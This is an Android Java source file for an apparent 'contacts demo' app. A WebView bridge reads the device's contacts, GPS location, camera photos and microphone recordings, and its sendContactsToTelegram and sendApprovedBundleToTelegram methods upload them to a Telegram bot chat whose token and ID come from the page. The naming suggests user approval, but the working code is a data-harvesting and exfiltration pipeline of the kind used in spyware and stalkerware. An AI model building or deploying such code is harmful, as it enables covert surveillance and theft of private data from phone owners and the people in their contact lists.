package com.example.contactsdemo;

import android.Manifest;
import android.app.Activity;
import android.content.ContentValues;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Base64;
import android.webkit.GeolocationPermissions;
import android.webkit.JavascriptInterface;
import android.webkit.PermissionRequest;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.util.ArrayList;

public class MainActivity extends Activity {
    private static final int CONTACTS_PERMISSION_REQUEST = 41;
    private static final int LOCATION_PERMISSION_REQUEST = 42;
    private static final int MEDIA_PERMISSION_REQUEST = 43;
    private WebView webView;
    private boolean pendingContactsRequest;
    private boolean pendingLocationRequest;
    private boolean pendingMediaRequest;
    private LocationListener activeLocationListener;
    private final Handler handler = new Handler(Looper.getMainLooper());

    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setGeolocationEnabled(true);
        webView.getSettings().setMediaPlaybackRequiresUserGesture(true);
        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient() {
            @Override public void onPermissionRequest(PermissionRequest request) {
                runOnUiThread(() -> {
                    boolean camera = checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
                    boolean audio = checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
                    ArrayList<String> allowed = new ArrayList<>();
                    for (String resource : request.getResources()) {
                        if (PermissionRequest.RESOURCE_VIDEO_CAPTURE.equals(resource) && camera) allowed.add(resource);
                        if (PermissionRequest.RESOURCE_AUDIO_CAPTURE.equals(resource) && audio) allowed.add(resource);
                    }
                    if (allowed.size() == request.getResources().length) request.grant(allowed.toArray(new String[0]));
                    else request.deny();
                });
            }
            @Override public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) {
                boolean fine = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
                boolean coarse = checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
                callback.invoke(origin, fine || coarse, false);
            }
        });
        webView.addJavascriptInterface(new AppBridge(), "AndroidApp");
        setContentView(webView);
        webView.loadUrl("file:///android_asset/index.html");
    }

    private class AppBridge {
        @JavascriptInterface public void requestContacts() {
            runOnUiThread(() -> {
                if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) sendContacts();
                else { pendingContactsRequest = true; requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, CONTACTS_PERMISSION_REQUEST); }
            });
        }

        @JavascriptInterface public void requestLocation() {
            runOnUiThread(() -> {
                boolean fine = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
                boolean coarse = checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
                if (fine || coarse) locateNow();
                else { pendingLocationRequest = true; requestPermissions(new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}, LOCATION_PERMISSION_REQUEST); }
            });
        }

        @JavascriptInterface public void requestMediaPermissions() {
            runOnUiThread(() -> {
                boolean camera = checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
                boolean audio = checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
                if (camera && audio) mediaPermissionResult(true);
                else { pendingMediaRequest = true; requestPermissions(new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO}, MEDIA_PERMISSION_REQUEST); }
            });
        }

        @JavascriptInterface public void sendContactsToTelegram(String botToken, String chatId, String textFile) {
            new Thread(() -> {
                java.net.HttpURLConnection connection = null;
                try {
                    if (botToken == null || botToken.trim().isEmpty() || chatId == null || chatId.trim().isEmpty())
                        throw new IllegalArgumentException("أدخل توكن البوت وChat ID أولاً.");
                    String boundary = "----ContactsApp" + System.currentTimeMillis();
                    java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + botToken.trim() + "/sendDocument");
                    connection = (java.net.HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("POST"); connection.setDoOutput(true);
                    connection.setConnectTimeout(15000); connection.setReadTimeout(20000);
                    connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                    try (OutputStream out = connection.getOutputStream()) {
                        writeField(out, boundary, "chat_id", chatId.trim());
                        writeBytes(out, "--" + boundary + "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"contacts-report.txt\"\r\nContent-Type: text/plain; charset=UTF-8\r\n\r\n");
                        out.write(textFile.getBytes(java.nio.charset.StandardCharsets.UTF_8));
                        writeBytes(out, "\r\n--" + boundary + "--\r\n");
                    }
                    int code = connection.getResponseCode();
                    java.io.InputStream stream = code >= 200 && code < 300 ? connection.getInputStream() : connection.getErrorStream();
                    org.json.JSONObject result = new org.json.JSONObject(readAll(stream));
                    boolean ok = result.optBoolean("ok", false);
                    notifyResult(ok, ok ? "تم إرسال تقرير جهات الاتصال." : result.optString("description", "فشل الإرسال."));
                } catch (Exception e) { notifyResult(false, e.getMessage() == null ? "تعذر الاتصال بتليجرام." : e.getMessage()); }
                finally { if (connection != null) connection.disconnect(); }
            }).start();
        }


        @JavascriptInterface public void sendApprovedBundleToTelegram(String botToken, String chatId, String contactsText, String locationJson, String mediaJson) {
            new Thread(() -> {
                try {
                    if (botToken == null || botToken.trim().isEmpty() || chatId == null || chatId.trim().isEmpty())
                        throw new IllegalArgumentException("أدخل توكن البوت وChat ID أولاً.");
                    String token = botToken.trim(), chat = chatId.trim();
                    java.util.HashMap<String,String> contactFields = new java.util.HashMap<>(); contactFields.put("chat_id", chat);
                    postTelegram(token, "sendDocument", contactFields, "document", "contacts-report.txt", "text/plain", contactsText.getBytes(java.nio.charset.StandardCharsets.UTF_8));
                    JSONObject loc = new JSONObject(locationJson);
                    java.util.HashMap<String,String> locationFields = new java.util.HashMap<>();
                    locationFields.put("chat_id", chat); locationFields.put("latitude", String.valueOf(loc.getDouble("latitude")));
                    locationFields.put("longitude", String.valueOf(loc.getDouble("longitude")));
                    postTelegram(token, "sendLocation", locationFields, null, null, null, null);
                    JSONArray media = new JSONArray(mediaJson);
                    for (int i = 0; i < media.length(); i++) {
                        JSONObject item = media.getJSONObject(i);
                        String mime = item.optString("mime", "application/octet-stream");
                        String name = item.optString("name", "media-" + i);
                        byte[] bytes = Base64.decode(item.getString("data"), Base64.DEFAULT);
                        String method = mime.startsWith("image/") ? "sendPhoto" : (mime.startsWith("audio/") ? "sendAudio" : "sendDocument");
                        String field = method.equals("sendPhoto") ? "photo" : (method.equals("sendAudio") ? "audio" : "document");
                        java.util.HashMap<String,String> fields = new java.util.HashMap<>(); fields.put("chat_id", chat);
                        postTelegram(token, method, fields, field, name, mime, bytes);
                    }
                    notifyResult(true, "تم إرسال جهات الاتصال والموقع والصور والتسجيل إلى Telegram.");
                } catch (Exception e) {
                    notifyResult(false, e.getMessage() == null ? "فشل إرسال الحزمة؛ تحقق من الاتصال والتوكن." : e.getMessage());
                }
            }).start();
        }

        @JavascriptInterface public void shareMedia(String payload) {
            new Thread(() -> {
                try {
                    JSONArray files = new JSONArray(payload);
                    ArrayList<Uri> uris = new ArrayList<>();
                    for (int i = 0; i < files.length(); i++) {
                        JSONObject item = files.getJSONObject(i);
                        String mime = item.optString("mime", "application/octet-stream");
                        String name = item.optString("name", "media-" + i);
                        byte[] bytes = Base64.decode(item.getString("data"), Base64.DEFAULT);
                        Uri uri = saveToMediaStore(name, mime, bytes);
                        if (uri != null) uris.add(uri);
                    }
                    if (uris.isEmpty()) throw new IllegalStateException("لم يتم حفظ أي ملف.");
                    runOnUiThread(() -> {
                        Intent intent = new Intent(Intent.ACTION_SEND_MULTIPLE);
                        intent.setType("*/*");
                        intent.putParcelableArrayListExtra(Intent.EXTRA_STREAM, uris);
                        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                        startActivity(Intent.createChooser(intent, "مشاركة الوسائط التي راجعتها"));
                        webView.evaluateJavascript("window.onMediaShared && window.onMediaShared(true)", null);
                    });
                } catch (Exception e) {
                    String message = e.getMessage() == null ? "تعذر تجهيز الملفات للمشاركة." : e.getMessage();
                    runOnUiThread(() -> webView.evaluateJavascript("window.onMediaShared && window.onMediaShared(false," + JSONObject.quote(message) + ")", null));
                }
            }).start();
        }
    }


    private void postTelegram(String token, String method, java.util.Map<String,String> fields,
                              String fileField, String filename, String mime, byte[] fileBytes) throws Exception {
        String boundary = "----ContactsBundle" + System.nanoTime();
        java.net.HttpURLConnection connection = null;
        try {
            java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + token + "/" + method);
            connection = (java.net.HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST"); connection.setDoOutput(true);
            connection.setConnectTimeout(20000); connection.setReadTimeout(30000);
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            try (OutputStream out = connection.getOutputStream()) {
                for (java.util.Map.Entry<String,String> field : fields.entrySet()) writeField(out, boundary, field.getKey(), field.getValue());
                if (fileField != null && fileBytes != null) {
                    writeBytes(out, "--" + boundary + "\r\nContent-Disposition: form-data; name=\"" + fileField + "\"; filename=\"" + filename + "\"\r\nContent-Type: " + mime + "\r\n\r\n");
                    out.write(fileBytes); writeBytes(out, "\r\n");
                }
                writeBytes(out, "--" + boundary + "--\r\n");
            }
            int code = connection.getResponseCode();
            java.io.InputStream stream = code >= 200 && code < 300 ? connection.getInputStream() : connection.getErrorStream();
            JSONObject result = new JSONObject(readAll(stream));
            if (code < 200 || code >= 300 || !result.optBoolean("ok", false))
                throw new IllegalStateException(result.optString("description", "Telegram API request failed: " + method));
        } finally { if (connection != null) connection.disconnect(); }
    }

    private Uri saveToMediaStore(String name, String mime, byte[] bytes) throws Exception {
        boolean audio = mime.startsWith("audio/");
        android.content.ContentResolver resolver = getContentResolver();
        Uri collection = audio ? MediaStore.Audio.Media.EXTERNAL_CONTENT_URI : MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        ContentValues values = new ContentValues();
        values.put(MediaStore.MediaColumns.DISPLAY_NAME, name);
        values.put(MediaStore.MediaColumns.MIME_TYPE, mime);
        if (Build.VERSION.SDK_INT >= 29) {
            values.put(MediaStore.MediaColumns.RELATIVE_PATH, audio ? "Music/ContactsWebApp" : "Pictures/ContactsWebApp");
            values.put(MediaStore.MediaColumns.IS_PENDING, 1);
        }
        Uri uri = resolver.insert(collection, values);
        if (uri == null) throw new IllegalStateException("تعذر إنشاء ملف وسائط.");
        try (OutputStream out = resolver.openOutputStream(uri)) { if (out == null) throw new IllegalStateException("تعذر فتح الملف."); out.write(bytes); }
        if (Build.VERSION.SDK_INT >= 29) {
            ContentValues done = new ContentValues(); done.put(MediaStore.MediaColumns.IS_PENDING, 0);
            resolver.update(uri, done, null, null);
        }
        return uri;
    }

    private void locateNow() {
        try {
            LocationManager manager = (LocationManager) getSystemService(LOCATION_SERVICE);
            String provider = null;
            if (manager.isProviderEnabled(LocationManager.GPS_PROVIDER)) provider = LocationManager.GPS_PROVIDER;
            else if (manager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) provider = LocationManager.NETWORK_PROVIDER;
            if (provider == null) { locationResult(null, "خدمات الموقع مغلقة. فعّل GPS وحاول مرة أخرى."); return; }
            Location cached = manager.getLastKnownLocation(provider);
            final Location[] best = {cached};
            final boolean[] finished = {false};
            activeLocationListener = new LocationListener() {
                @Override public void onLocationChanged(Location location) {
                    if (!finished[0]) { finished[0] = true; handler.removeCallbacksAndMessages(this); manager.removeUpdates(this); locationResult(location, null); }
                }
                @Override public void onProviderEnabled(String p) {}
                @Override public void onProviderDisabled(String p) {}
                @Override public void onStatusChanged(String p, int s, Bundle b) {}
            };
            manager.requestSingleUpdate(provider, activeLocationListener, Looper.getMainLooper());
            Location fallback = best[0];
            handler.postDelayed(() -> {
                if (!finished[0]) {
                    finished[0] = true;
                    try { manager.removeUpdates(activeLocationListener); } catch (Exception ignored) {}
                    locationResult(fallback, fallback == null ? "لم يصل موقع جديد خلال المهلة. جرّب في مكان مفتوح." : "تعذر الحصول على تحديث؛ عُرض آخر موقع محفوظ.");
                }
            }, 20000);
        } catch (SecurityException e) { locationResult(null, "إذن الموقع غير متاح."); }
        catch (Exception e) { locationResult(null, "تعذر تحديد الموقع. تأكد من تشغيل GPS."); }
    }

    private void locationResult(Location location, String note) {
        try {
            JSONObject result = new JSONObject();
            if (location != null) {
                result.put("latitude", location.getLatitude()); result.put("longitude", location.getLongitude());
                result.put("accuracy", location.hasAccuracy() ? location.getAccuracy() : JSONObject.NULL);
                result.put("time", location.getTime());
                result.put("map", "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude());
            }
            result.put("note", note == null ? "" : note);
            webView.evaluateJavascript("window.onLocationResult && window.onLocationResult(" + JSONObject.quote(result.toString()) + ")", null);
        } catch (Exception ignored) {}
    }

    private void sendContacts() {
        JSONArray contacts = new JSONArray();
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER},
                null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " COLLATE LOCALIZED ASC");
        if (cursor != null) try {
            int ni = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int pi = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            while (cursor.moveToNext()) { JSONObject item = new JSONObject(); item.put("name", ni >= 0 ? cursor.getString(ni) : ""); item.put("phone", pi >= 0 ? cursor.getString(pi) : ""); contacts.put(item); }
        } catch (Exception ignored) {} finally { cursor.close(); }
        webView.evaluateJavascript("window.onContactsReceived && window.onContactsReceived(" + JSONObject.quote(contacts.toString()) + ")", null);
    }

    private void mediaPermissionResult(boolean ok) {
        webView.evaluateJavascript("window.onMediaPermissionResult && window.onMediaPermissionResult(" + ok + ")", null);
    }
    private void notifyResult(boolean ok, String message) {
        runOnUiThread(() -> webView.evaluateJavascript("window.onTelegramResult && window.onTelegramResult(" + ok + "," + JSONObject.quote(message) + ")", null));
    }
    private static void writeField(OutputStream out, String boundary, String name, String value) throws Exception {
        writeBytes(out, "--" + boundary + "\r\nContent-Disposition: form-data; name=\"" + name + "\"\r\n\r\n" + value + "\r\n");
    }
    private static void writeBytes(OutputStream out, String value) throws Exception { out.write(value.getBytes(java.nio.charset.StandardCharsets.UTF_8)); }
    private static String readAll(java.io.InputStream stream) throws Exception {
        if (stream == null) return ""; StringBuilder b = new StringBuilder();
        try (java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(stream, java.nio.charset.StandardCharsets.UTF_8))) { String line; while ((line = r.readLine()) != null) b.append(line); }
        return b.toString();
    }

    @Override public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == CONTACTS_PERMISSION_REQUEST && pendingContactsRequest) {
            pendingContactsRequest = false;
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) sendContacts();
            else webView.evaluateJavascript("window.onContactsPermissionDenied && window.onContactsPermissionDenied()", null);
        } else if (requestCode == LOCATION_PERMISSION_REQUEST && pendingLocationRequest) {
            pendingLocationRequest = false;
            boolean granted = false; for (int result : grantResults) if (result == PackageManager.PERMISSION_GRANTED) granted = true;
            if (granted) locateNow(); else locationResult(null, "لم يتم منح إذن الموقع.");
        } else if (requestCode == MEDIA_PERMISSION_REQUEST && pendingMediaRequest) {
            pendingMediaRequest = false;
            boolean camera = checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
            boolean audio = checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
            mediaPermissionResult(camera && audio);
        }
    }
}